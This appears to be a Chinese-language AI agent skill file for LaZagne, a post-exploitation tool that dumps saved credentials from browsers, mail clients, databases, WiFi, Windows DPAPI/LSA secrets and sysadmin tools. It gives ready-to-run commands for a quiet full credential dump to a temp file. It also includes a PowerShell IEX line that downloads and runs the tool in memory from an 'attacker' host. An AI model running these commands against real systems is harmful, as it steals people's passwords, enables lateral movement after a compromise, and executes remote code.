---
name: lazagne
description: >
  此技能适用于用户询问关于"lazagne"、"从被攻陷主机中转储已保存凭证"、"提取浏览器密码，恢复应用程序凭证"、"收集所有本地凭证用于横向移动"。后渗透凭证恢复工具，从浏览器、邮件客户端、数据库、Git、WiFi 及其他已安装应用中提取已保存密码。
---

# LaZagne

从已安装应用中进行后渗透凭证恢复 — 浏览器、邮件、Git、数据库、WiFi 等。

## 快速开始

```cmd
# 转储所有凭证
lazagne.exe all

# 仅浏览器
lazagne.exe browsers

# 特定模块
lazagne.exe windows
```

## 模块分类

| 分类 | 覆盖范围 |
|------|----------|
| `browsers` | Chrome、Firefox、Edge、Opera、IE、Brave |
| `windows` | 凭证管理器、DPAPI、LSA secrets、Vault |
| `mails` | Thunderbird、Outlook、Outlook Express |
| `databases` | MySQL、PostgreSQL、MSSQL、Oracle |
| `network` | WiFi 密码、VPN（Cisco、OpenVPN、WireGuard） |
| `memory` | KeePass、mRemoteNG、Pidgin |
| `git` | Git 凭证 |
| `chats` | Skype |
| `sysadmin` | WinSCP、PuTTY、FileZilla、mRemoteNG、TeamViewer |

## 核心参数

| 参数 | 说明 |
|------|------|
| `all` | 运行所有模块 |
| `<module>` | 运行指定模块分类 |
| `-oJ <file>` | JSON 输出 |
| `-oN <file>` | 文本输出 |
| `-oA <dir>` | 所有输出格式保存到目录 |
| `-v` | 详细输出 |
| `-vv` | 调试输出 |
| `-quiet` | 无横幅 |

## 常用工作流

```cmd
# 全量凭证转储到 JSON
lazagne.exe all -oJ C:\Windows\Temp\creds.json -quiet

# 仅浏览器凭证
lazagne.exe browsers -v

# 系统管理员工具凭证（WinSCP、FileZilla 等）
lazagne.exe sysadmin

# WiFi 密码
lazagne.exe network

# 从 PowerShell 运行（如需在内存中执行）
# 下载并运行而不落盘：
IEX(New-Object Net.WebClient).DownloadString('http://attacker/LaZagne.py')
```

## 输出示例

```
[+] Password found !!!
URL: https://corp-mail.example.com
Login: john.doe@example.com
Password: Summer2024!
```

## 参考资源

| 文件 | 加载时机 |
|------|----------|
| `references/credential-sources.md` | 模块详情、DPAPI 解密、浏览器 DB 路径、输出解析 |
